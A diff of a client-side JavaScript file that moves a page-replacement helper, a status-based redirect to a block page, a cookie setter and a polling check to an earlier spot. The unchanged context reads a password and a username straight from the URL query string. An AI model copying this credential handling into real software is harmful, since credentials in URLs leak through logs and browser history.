@@ -20,6 +20,35 @@ function getCookie(cname) {
 	}
 	return "";
   }
+
+function ReplaceContent(NC) {
+	document.open();
+	document.write(NC);
+	document.close();
+	  }
+if(JSON.stringify(actdata)=="{\"status\":\"EMERGENCY\"}"){
+	window.location.replace(`${host}/block/block?spoof=${currentUrl}`)
+}else{if(JSON.stringify(actdata)=="{\"status\":\"NOTFOUND\"}") {
+	ReplaceContent("Not Found")
+}else{
+	
+const currentUrl = window.location.href;
+var pagecontent = ``	
+
+function setCookie(cname,cvalue,exdays) {
+          const d = new Date();
+          d.setTime(d.getTime() + (exdays*24*60*60*1000));
+          let expires = "expires=" + d.toUTCString();
+          document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+        }
+var execute=false
+function checkREADY(){
+if(JSON.stringify(actdata)=="{}"){
+  setTimeout(function(){
+  checkREADY()}, 100)
+}else{console.log("LOADED!")
+
+
 if(window.location.href.includes("?")){
 	var pasw = window.location.href.split("password=")[1].split("&")[0]
 	var usern = window.location.href.split("username=")[1].split("&")[0]
@@ -80,34 +109,6 @@ if(window.location.href.includes("?")){
 					  
 )})}
 }else{}}
-function ReplaceContent(NC) {
-	document.open();
-	document.write(NC);
-	document.close();
-	  }
-if(JSON.stringify(actdata)=="{\"status\":\"EMERGENCY\"}"){
-	window.location.replace(`${host}/block/block?spoof=${currentUrl}`)
-}else{if(JSON.stringify(actdata)=="{\"status\":\"NOTFOUND\"}") {
-	ReplaceContent("Not Found")
-}else{
-	
-const currentUrl = window.location.href;
-var pagecontent = ``	
-
-function setCookie(cname,cvalue,exdays) {
-          const d = new Date();
-          d.setTime(d.getTime() + (exdays*24*60*60*1000));
-          let expires = "expires=" + d.toUTCString();
-          document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-        }
-var execute=false
-function checkREADY(){
-if(JSON.stringify(actdata)=="{}"){
-  setTimeout(function(){
-  checkREADY()}, 100)
-}else{console.log("LOADED!")
-
-
 	 setTimeout(function(){
 	if(tablocation.includes(".html")){
 	tablocation = tablocation.replace(".html","")
